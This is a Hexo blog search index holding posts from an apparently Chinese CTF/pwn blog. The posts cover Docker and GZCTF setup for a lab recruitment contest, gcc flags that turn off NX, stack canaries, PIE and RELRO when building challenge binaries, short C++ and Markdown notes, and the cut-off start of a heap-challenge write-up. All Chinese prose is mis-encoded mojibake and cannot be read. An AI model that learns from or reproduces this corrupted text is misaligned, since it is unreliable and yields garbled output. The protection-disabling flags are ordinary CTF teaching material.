<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>docker shè„šæœ¬</title>
      <link href="/2025/02/18/docker-sh%E8%84%9A%E6%9C%AC/"/>
      <url>/2025/02/18/docker-sh%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<p>è„šæœ¬ä» Windows ä¼ è¾“åˆ° Linuxå¯¼è‡´è„šæœ¬æ— æ³•æ‰§è¡Œã€‚<span id="more"></span></p><p>åœ¨é…ç½®webåŠ¨æ€flagçš„æ—¶å€™å‘ç°ä¸€ä¸ªé—®é¢˜ï¼šflag.shæ— æ³•æ‰§è¡Œåœ¨ç»è¿‡é•¿æ—¶é—´çš„è¯•é”™ä¹‹åå‘ç°</p><p>å¦‚æœè„šæœ¬ä» Windows ä¼ è¾“åˆ° Linuxï¼Œå¯èƒ½åŒ…å« Windows æ ¼å¼çš„æ¢è¡Œç¬¦ï¼ˆ<code>\r\n</code>ï¼‰ï¼Œè¿™ä¼šå¯¼è‡´è„šæœ¬æ— æ³•æ‰§è¡Œã€‚</p><p>è§£å†³æ–¹æ³•ï¼š</p><p>ç”¨ä¸‹æ–¹è¯­å¥æ£€æŸ¥å¦‚æœçœ‹åˆ° <code>^M</code> å­—ç¬¦ï¼Œè¯´æ˜æ–‡ä»¶æ˜¯ Windows æ ¼å¼</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat -v flag.sh</span><br></pre></td></tr></tbody></table></figure><p><img src="/2025/02/18/docker-sh%E8%84%9A%E6%9C%AC/Blogs\source_posts\docker-shè„šæœ¬\docker-sh1.png"></p><p>å†ç”¨</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dos2unix flag.sh</span><br></pre></td></tr></tbody></table></figure><p>å°†å…¶è½¬æ¢ä¸º Unix æ ¼å¼</p><p>é‚£ä¹ˆæ ¹æ®æ­¤åŸç†Dockerfileæ›´æ”¹å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">FROM base_image_nginx_mysql_php_56</span><br><span class="line"></span><br><span class="line">COPY src /var/www/html</span><br><span class="line"></span><br><span class="line">RUN mv /var/www/html/flag.sh / &amp;&amp; \</span><br><span class="line">    chmod +x /flag.sh</span><br><span class="line">RUN dos2unix /flag.sh</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><img src="/2025/02/18/docker-sh%E8%84%9A%E6%9C%AC/Blogs\source_posts\docker-shè„šæœ¬\docker-sh2.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HENUCTF</title>
      <link href="/2025/02/18/HENUCTF/"/>
      <url>/2025/02/18/HENUCTF/</url>
      
        <content type="html"><![CDATA[<p>è®°ä¸€æ¬¡ç”¨GZCTFå’Œctf-docker-templateéƒ¨ç½²pwnä½œä¸ºå®éªŒå®¤æ‹›æ–°èµ›çš„è¿‡ç¨‹<span id="more"></span></p><p>ç¬”è€…ç”¨çš„æ˜¯Ubuntu 22.04å…¶ä»–çš„å¦‚KaliåŒºåˆ«ä¸å¤§</p><h2 id="å‰ç½®"><a href="#å‰ç½®" class="headerlink" title="å‰ç½®"></a>å‰ç½®</h2><h3 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h3><p>GZCTFé»˜è®¤ç”¨çš„æ•°æ®åº“æ˜¯PostgreSQLï¼Œé¦–å…ˆå…ˆå®‰è£…è¿™ä¸ªæ•°æ®åº“ï¼Œè¦ä¸ç„¶ä¼šå‡ºé”™ï¼Œè€Œä¸”è¦åœ¨é…ç½®GZCTFä¹‹å‰å®‰è£…ï¼Œå¦‚æœä¹‹åå®‰è£…ä¹Ÿä¼šå‡ºé”™ã€‚</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install postgresql postgresql-client</span><br></pre></td></tr></tbody></table></figure><h3 id="docker-docker-compose"><a href="#docker-docker-compose" class="headerlink" title="docker &amp; docker-compose"></a>docker &amp; docker-compose</h3><h4 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h4><p>å¸è½½è€ç‰ˆæœ¬docker</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get remove docker docker-engine docker.io containerd runc</span><br></pre></td></tr></tbody></table></figure><p>æ›´æ–°äºŒè¿</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt upgrade</span><br></pre></td></tr></tbody></table></figure><p>å®‰è£…ä¸€äº›ä¾èµ–</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install ca-certificates curl gnupg lsb-release</span><br></pre></td></tr></tbody></table></figure><p>æ·»åŠ dockerå®˜æ–¹GPGå¯†é’¥</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL http://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo apt-key add -</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>æ·»åŠ Dockerè½¯ä»¶æº</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository "deb [arch=amd64] http://mirrors.aliyun.com/docker-ce/linux/ubuntu $(lsb_release -cs) stable"</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>å®‰è£…</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></tbody></table></figure><p>é…ç½®ç”¨æˆ·ç»„ï¼ˆå¯é€‰ï¼šåœ¨æ™®é€šç”¨æˆ·ä¸‹å¯ä»¥ç›´æ¥æ‰§è¡Œdockerå‘½ä»¤ï¼Œæ¨è)</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo usermod -aG docker $USER</span><br></pre></td></tr></tbody></table></figure><p><strong>æ³¨ï¼šé‡æ–°ç™»å½•æ‰èƒ½ä½¿æ›´æ”¹ç”Ÿæ•ˆã€‚</strong></p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡å¯åŠ¨<code>docker</code>æ¥éªŒè¯æˆ‘ä»¬æ˜¯å¦æˆåŠŸå®‰è£…ã€‚å‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start docker</span><br><span class="line">sudo systemctl status docker</span><br><span class="line">sudo systemctl enable docker</span><br></pre></td></tr></tbody></table></figure><p>å®‰è£…å·¥å…·</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get -y install apt-transport-https ca-certificates curl software-properties-common</span><br></pre></td></tr></tbody></table></figure><p>é‡å¯docker</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></tbody></table></figure><p>éªŒè¯æ˜¯å¦æˆåŠŸ</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run hello-world</span><br></pre></td></tr></tbody></table></figure><h4 id="docker-compose"><a href="#docker-compose" class="headerlink" title="docker-compose"></a>docker-compose</h4><p>ä¸¤ç§æ–¹æ³•ï¼š</p><ol><li><p>ä½¿ç”¨äºŒè¿›åˆ¶æ–‡ä»¶å®‰è£…docker-compose</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo curl -L "https://github.com/docker/compose/releases/download/v2.6.1/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose</span><br></pre></td></tr></tbody></table></figure><p><strong>æ³¨ï¼šå¦‚æœè¦å®‰è£…å…¶ä»–ç‰ˆæœ¬æ›¿æ¢å‘½ä»¤ä¸­çš„æ•°å­—å³å¯ã€‚</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod +x /usr/local/bin/docker-compose</span><br></pre></td></tr></tbody></table></figure><p>æŸ¥çœ‹ç‰ˆæœ¬éªŒè¯å®‰è£…æ˜¯å¦æˆåŠŸ</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose version</span><br></pre></td></tr></tbody></table></figure></li><li><p>pipå®‰è£…docker-compose</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install docker-compose</span><br></pre></td></tr></tbody></table></figure><p>æ£€æŸ¥ç‰ˆæœ¬åŒä¸Š</p></li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#gcc æœªç¼–è¯‘æ–‡ä»¶å -o ç¼–è¯‘å®Œæˆåæ–‡ä»¶å</span><br><span class="line">#é»˜è®¤ä¿æŠ¤å…¨å¼€</span><br><span class="line">gcc csu.c -o csu</span><br><span class="line">#éƒ¨åˆ†å¼€å¯gotè¡¨ï¼Œå…³é—­stackä¿æŠ¤ï¼Œå…³é—­pie,-o ç¼–è¯‘å®Œæˆæ–‡ä»¶åï¼Œæœªç¼–è¯‘æ–‡ä»¶å</span><br><span class="line">gcc -z lazy -fno-stack-protector -no-pie -o csu csu.c</span><br><span class="line">#gccç¼–è¯‘ä¸­çš„é›†ä¸­ä¿æŠ¤æ‰“å¼€å’Œå…³é—­</span><br><span class="line"> </span><br><span class="line">#    å…³é—­NX        /    å¼€å¯NX</span><br><span class="line">    -z execstack /    -z noexecstack</span><br><span class="line"> </span><br><span class="line">#    å…³é—­canary    /    å¼€å¯canary</span><br><span class="line">    -fno-stack-protector    /    -fstack-protector-all</span><br><span class="line"> </span><br><span class="line">#    å…³é—­pie    / å¼€å¯pie</span><br><span class="line">    -no-pie    /    -pie</span><br><span class="line"> </span><br><span class="line">#    å…³é—­relro    /    éƒ¨åˆ†å¼€å¯relro    /    å®Œå…¨å¼€å¯relro</span><br><span class="line">    -z norelro    /    -z lazy    /    -z now</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sendline-and-send</title>
      <link href="/2025/02/18/sendline-and-send/"/>
      <url>/2025/02/18/sendline-and-send/</url>
      
        <content type="html"><![CDATA[<p>å½“ç¨‹åºæ¥æ”¶ä¸€å®šæ•°é‡(count)å­—ç¬¦æ—¶ï¼Œç”¨sendline(count)ï¼Œåˆ™ä¼šåœ¨ç¼“å†²åŒºå¤šå‡ºä¸€ä¸ªæ¢è¡Œç¬¦\nå¯èƒ½ä¼šå¯¼è‡´é”™è¯¯ï¼Œæ­¤ç§æƒ…å†µä¸‹åº”è¯¥ç”¨sendã€‚</p><p>æœ‰æ—¶å€™ä¼ªéšæœºï¼Œå¯ä»¥åœ¨æœ¬åœ°èµ·ä¸€ä¸ªç¨‹åºæ¥å¾—åˆ°éšæœºæ•°  </p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.popen(<span class="string">""</span>).read()</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Some_c++_knowledge_points</title>
      <link href="/2024/10/11/Some-c-knowledge-points/"/>
      <url>/2024/10/11/Some-c-knowledge-points/</url>
      
        <content type="html"><![CDATA[<p>åœ¨åšé¢˜çš„æ—¶å€™ä¼šæ¥è§¦åˆ°ä¸€äº›é›¶ç¢çš„çŸ¥è¯†ç‚¹ï¼ˆä½œä¸ºä¸€ä¸ªå°ç™½ï¼‰ï¼Œè®°å½•é˜²å¿˜ã€‚<span id="more"></span></p><ol><li><p>æœ‰æ—¶ä¼šæ ¹æ®æŸäº›è§„å¾‹å®šé‡è¾“å‡ºä¸€å®šæ•°é‡çš„ç©ºæ ¼</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"%*s"</span>, i, <span class="string">" "</span>);<span class="comment">//*æ˜¯å ä½ï¼ŒæŒ‡çš„æ˜¯iä»£è¡¨çš„åŸŸå®½ã€‚</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Initialized string: %.*s\n"</span>, <span class="built_in">sizeof</span>(str), str);</span><br></pre></td></tr></tbody></table></figure></li><li><p>åŸºäºèŒƒå›´çš„forå¾ªç¯</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> arr[] = {<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>};</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> e : arr)</span><br><span class="line">{</span><br><span class="line">cout &lt;&lt; e &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li><li><p>åä¸‰è§’å‡½æ•°</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2024/10/11/hello-world/"/>
      <url>/2024/10/11/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.<span id="more"></span></p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MD å­¦ä¹ è®°å½•</title>
      <link href="/2024/10/11/my-first-blog-about-MD/"/>
      <url>/2024/10/11/my-first-blog-about-MD/</url>
      
        <content type="html"><![CDATA[<p>ä¸ºäº†ç£ä¿ƒæˆ‘çš„å­¦ä¹ å†™ä¸€ç¯‡è®°å½•æˆ‘çš„å­¦ä¹ è¿›ç¨‹<span id="more"></span></p><h3 id="æ ‡é¢˜"><a href="#æ ‡é¢˜" class="headerlink" title="æ ‡é¢˜"></a>æ ‡é¢˜</h3><p><code># ä¸€çº§æ ‡é¢˜</code></p><p><code>## äºŒçº§æ ‡é¢˜</code></p><p><code>### ä¸‰çº§æ ‡é¢˜</code></p><p><code>#### å››çº§æ ‡é¢˜</code></p><p><code>##### äº”çº§æ ‡é¢˜</code></p><p><code>###### å…­çº§æ ‡é¢˜</code></p><h3 id="å­—ä½“æ ·å¼"><a href="#å­—ä½“æ ·å¼" class="headerlink" title="å­—ä½“æ ·å¼"></a>å­—ä½“æ ·å¼</h3><p><em>è¿™æ˜¯æ–œä½“</em>   <code>*è¿™æ˜¯æ–œä½“*</code></p><p><strong>è¿™æ˜¯ç²—ä½“</strong>  <code>**è¿™æ˜¯ç²—ä½“**</code></p><p><em><strong>è¿™æ˜¯ç²—æ–œä½“</strong></em>  <code>***è¿™æ˜¯ç²—æ–œä½“***</code></p><p><del>è¿™æ˜¯åˆ é™¤çº¿</del>  <code>~~è¿™æ˜¯åˆ é™¤çº¿~~</code></p><h3 id="æ¢è¡Œ"><a href="#æ¢è¡Œ" class="headerlink" title="æ¢è¡Œ"></a>æ¢è¡Œ</h3><p>è¿™æ˜¯æ–‡æœ¬ä¸€<br>è¿™æ˜¯æ–‡æœ¬äºŒ</p><p>è¿™æ˜¯æ–‡æœ¬ä¸€</p><p>è¿™æ˜¯æ–‡æœ¬äºŒ</p><p><code>è¿™æ˜¯æ–‡æœ¬ä¸€  è¿™æ˜¯æ–‡æœ¬äºŒ //æ®µè½å†…æ¢è¡Œä½¿ç”¨æ¢è¡Œç¬¦ &lt;br&gt;ï¼Œæˆ–è€… ä¸¤ä¸ªç©ºæ ¼ + shift-Enterã€‚</code></p><h3 id="åˆ—è¡¨"><a href="#åˆ—è¡¨" class="headerlink" title="åˆ—è¡¨"></a>åˆ—è¡¨</h3><ol><li><p>ç¬¬ä¸€</p></li><li><p>ç¬¬äºŒ</p></li><li><p>ç¬¬ä¸‰</p></li><li><p>ç¬¬ä¸€</p></li><li><p>ç¬¬äºŒ</p></li><li><p>ç¬¬äºŒ</p></li><li><p>ç¬¬äºŒ</p></li><li><p>ç¬¬å…­</p></li><li><p><input checked="" disabled="" type="checkbox"> å·²é€‰ä¸­çš„é€‰é¡¹</p></li><li><p><input disabled="" type="checkbox"> æœªé€‰ä¸­çš„é€‰é¡¹</p></li></ol><ul><li>ç¬¬ä¸€</li><li>ç¬¬äºŒ</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1. ç¬¬ä¸€</span><br><span class="line"></span><br><span class="line">2. ç¬¬äºŒ</span><br><span class="line"></span><br><span class="line">3. ç¬¬ä¸‰</span><br><span class="line"></span><br><span class="line">4. ç¬¬ä¸€</span><br><span class="line">5. ç¬¬äºŒ</span><br><span class="line">6. ç¬¬äºŒ</span><br><span class="line">7. ç¬¬äºŒ</span><br><span class="line">8. ç¬¬å…­</span><br><span class="line"></span><br><span class="line">9. [x] å·²é€‰ä¸­çš„é€‰é¡¹</span><br><span class="line">10. [ ] æœªé€‰ä¸­çš„é€‰é¡¹</span><br><span class="line"></span><br><span class="line">- ç¬¬ä¸€</span><br><span class="line">- ç¬¬äºŒ</span><br></pre></td></tr></tbody></table></figure><blockquote><p>å½“æŒ‰ä¸¤æ¬¡ç©ºæ ¼å‘ç°æ²¡æœ‰é€€å‡ºåˆ—è¡¨ï¼Œå¯ä»¥æŒ‰ctrl + [ å–æ¶ˆç¼©è¿›è¿”å›ä¸Šä¸€çº§ã€‚</p></blockquote><h3 id="å¼•ç”¨"><a href="#å¼•ç”¨" class="headerlink" title="å¼•ç”¨"></a>å¼•ç”¨</h3><blockquote><p>å¼•ç”¨</p></blockquote><p><code>&gt; è¿™æ˜¯å¼•ç”¨</code></p><h3 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h3><p>è¿™æ˜¯è¡Œå†…<code>ä»£ç </code></p><p><code>è¿™æ˜¯è¡Œå†…ä»£ç </code></p><h4 id="ä»£ç å—"><a href="#ä»£ç å—" class="headerlink" title="ä»£ç å—"></a>ä»£ç å—</h4><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cout &lt;&lt; <span class="string">"hello world"</span> &lt;&lt; endl;</span><br></pre></td></tr></tbody></table></figure><h3 id="åˆ†å‰²çº¿"><a href="#åˆ†å‰²çº¿" class="headerlink" title="åˆ†å‰²çº¿"></a>åˆ†å‰²çº¿</h3><hr><hr><h3 id="è¶…é“¾æ¥"><a href="#è¶…é“¾æ¥" class="headerlink" title="è¶…é“¾æ¥"></a>è¶…é“¾æ¥</h3><ol><li>é“¾æ¥åˆ°ç½‘ç«™<br><a href="https://ygkldnherr.github.io/">æˆ‘çš„å°ç«™</a> <code>[æˆ‘çš„å°ç«™](https://ygkldnherr.github.io)</code></li><li>è¿æ¥åˆ°å…¶ä»–Markdowné¡µé¢<br><a href="./hello-world">Markdown hello-world</a> <code>[Markdown hello-world](./hello-world)</code></li><li>æ— æ ‡ç­¾é“¾æ¥<br><a href="https://ygkldnherr.github.io/">https://ygkldnherr.github.io</a> <code>&lt;https://ygkldnherr.github.io&gt;</code></li><li>æ— æ ‡ç­¾é‚®ç®±é“¾æ¥<br><a href="mailto:ygkldnherr@gmail.com">ygkldnherr@gmail.com</a> <code>&lt;ygkldnherr@gmail.com&gt;</code></li><li>æ·»åŠ title<br><a href="./hello-world" title="ç‚¹å‡»è·³è½¬åˆ°hello-world">Markdown hello-world</a> <code>[Markdown hello-world](./hello-world "ç‚¹å‡»è·³è½¬åˆ°hello-world")</code></li><li>è‡ªåŠ¨è¶…é“¾æ¥<br><a href="https://ygkldnherr.github.io/">https://ygkldnherr.github.io</a> <code>https://ygkldnherr.github.io</code></li></ol><h3 id="å›¾ç‰‡"><a href="#å›¾ç‰‡" class="headerlink" title="å›¾ç‰‡"></a>å›¾ç‰‡</h3><ol><li>æ·»åŠ ä¸€ä¸ªå›¾ç‰‡<br><img src="/2024/10/11/my-first-blog-about-MD/Snipaste.png" alt="è¿™æ˜¯ä¸€ä¸ªå›¾ç‰‡"></li><li>å¸¦é“¾æ¥çš„å›¾ç‰‡<br><a href="https://ygkldnherr.github.io/"><img src="/2024/10/11/my-first-blog-about-MD/Snipaste.png" alt="è¿™æ˜¯ä¸€ä¸ªå›¾ç‰‡"></a></li><li>å¸¦titleçš„å›¾ç‰‡<br><img src="/2024/10/11/my-first-blog-about-MD/Snipaste.png" alt="è¿™æ˜¯ä¸€ä¸ªå›¾ç‰‡" title="è¿™æ˜¯ä¸€ä¸ªæˆªå›¾"></li></ol><h3 id="emoji"><a href="#emoji" class="headerlink" title="emoji"></a>emoji</h3><p>ä¸¤ç§æ–¹æ³•ï¼šä¸€ç§æ–¹æ³•æ˜¯ç›´æ¥è¾“å…¥ï¼Œå¦ä¸€ç§æ–¹æ³•æ˜¯åˆ©ç”¨è¡¨æƒ…çŸ­ç ï¼ˆåˆ©ç”¨ä¸¤ä¸ªå†’å·éš”å¼€ï¼‰<br><span class="github-emoji"><span>ğŸ˜‚</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f602.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <code>:joy:</code></p><h3 id="å†…åµŒHTML"><a href="#å†…åµŒHTML" class="headerlink" title="å†…åµŒHTML"></a>å†…åµŒHTML</h3><h3 id="è¡¨æ ¼"><a href="#è¡¨æ ¼" class="headerlink" title="è¡¨æ ¼"></a>è¡¨æ ¼</h3><table><thead><tr><th align="center">ç¬¬ä¸€åˆ—</th><th align="center">ç¬¬äºŒåˆ—</th><th align="center">ç¬¬ä¸‰åˆ—</th></tr></thead><tbody><tr><td align="center">ç¬¬ä¸€åˆ—ç¬¬ä¸€åˆ—</td><td align="center">ç¬¬äºŒåˆ—ç¬¬äºŒåˆ—</td><td align="center">ç¬¬ä¸‰åˆ—ç¬¬ä¸‰åˆ—</td></tr></tbody></table><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">|ç¬¬ä¸€åˆ—|ç¬¬äºŒåˆ—|ç¬¬ä¸‰åˆ—|</span><br><span class="line">|:---|:---:|---:|</span><br><span class="line">|è¿™æ˜¯å·¦å¯¹é½|è¿™æ˜¯å±…ä¸­å¯¹é½|è¿™æ˜¯å³å¯¹é½|</span><br></pre></td></tr></tbody></table></figure><h3 id="è„šæ³¨"><a href="#è„šæ³¨" class="headerlink" title="è„šæ³¨"></a>è„šæ³¨</h3><p>å¼•ç”¨è¯­æ³•ä¸º<code>[^åç§°]</code><br>å®šä¹‰è¯­æ³•ä¸º<code>[^åç§°]: å†…å®¹</code></p><blockquote><p>è„šæ³¨ä¹Ÿå¯ä»¥ä½œä¸ºå¸¸é‡æ¥ä½¿ç”¨ï¼Œå¦‚å½“å›¾ç‰‡åå¤ªé•¿æ—¶å¯ä»¥ç”¨è„šæ³¨æ¥ä»£æ›¿ã€‚</p></blockquote><h3 id="å…¬å¼"><a href="#å…¬å¼" class="headerlink" title="å…¬å¼"></a>å…¬å¼</h3><p>è¿™æ˜¯ä¸€ä¸ªå…¬å¼$ c^2 = a^2 + b^2 $<br>$$<br>c^2 = a^2 + b^2<br>$$</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>nssctf_girfriend</title>
      <link href="/2024/09/21/nssctf-girfriend/"/>
      <url>/2024/09/21/nssctf-girfriend/</url>
      
        <content type="html"><![CDATA[<p>nssctf_girlfriend<span id="more"></span></p><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p><img src="/2024/09/21/nssctf-girfriend/girlfriend_1.png"></p><p>64ä½ï¼Œå¼€å¯äº†Canaryå’ŒNX</p><h2 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h2><h3 id="menu"><a href="#menu" class="headerlink" title="menu"></a>menu</h3><p><img src="/2024/09/21/nssctf-girfriend/girlfriend_2.png"></p><p>menuå‡½æ•°ï¼Œç»å…¸çš„å †é¢˜å½¢å¼ï¼Œaddï¼Œdeleteï¼Œshow</p><h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><p><img src="/2024/09/21/nssctf-girfriend/girlfriend_3.png"></p><p>é¦–å…ˆæœ‰ä¸€ä¸ªgirlfriend_listä½äºbssæ®µç”¨äºå­˜å‚¨æ¯ä¸€ä¸ªgrilfriend_chunkçš„åœ°å€ï¼Œæ¯ä¸€ä¸ªgirlfriend malloc(0x10)çš„ç©ºé—´ï¼Œç¬¬ä¸€ä¸ªå­—èŠ‚å‚¨å­˜print_girlfriend_nameå‡½æ•°çš„åœ°å€ï¼Œç¬¬äºŒä¸ªå­—èŠ‚å‚¨å­˜girlfriend_nameçš„åœ°å€ï¼Œç”¨æˆ·è¾“å…¥sizeç»™v3ç»™girlfriend_name malloc(v3)çš„ç©ºé—´ï¼Œç»“æ„å¦‚ä¸‹å›¾</p><p><img src="/2024/09/21/nssctf-girfriend/girlfriend_4.png"></p><h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><p><img src="/2024/09/21/nssctf-girfriend/girlfriend_5.png"></p><p>è¾“å…¥ä¸‹æ ‡ï¼Œå¦‚æœæ˜¯0-9å…ˆfree name_pointå†free girlfriend_pointï¼Œè¿™ç‚¹ä¼šåœ¨åç»­fastbinä¸­ä½“ç°</p><h3 id="show"><a href="#show" class="headerlink" title="show"></a>show</h3><p><img 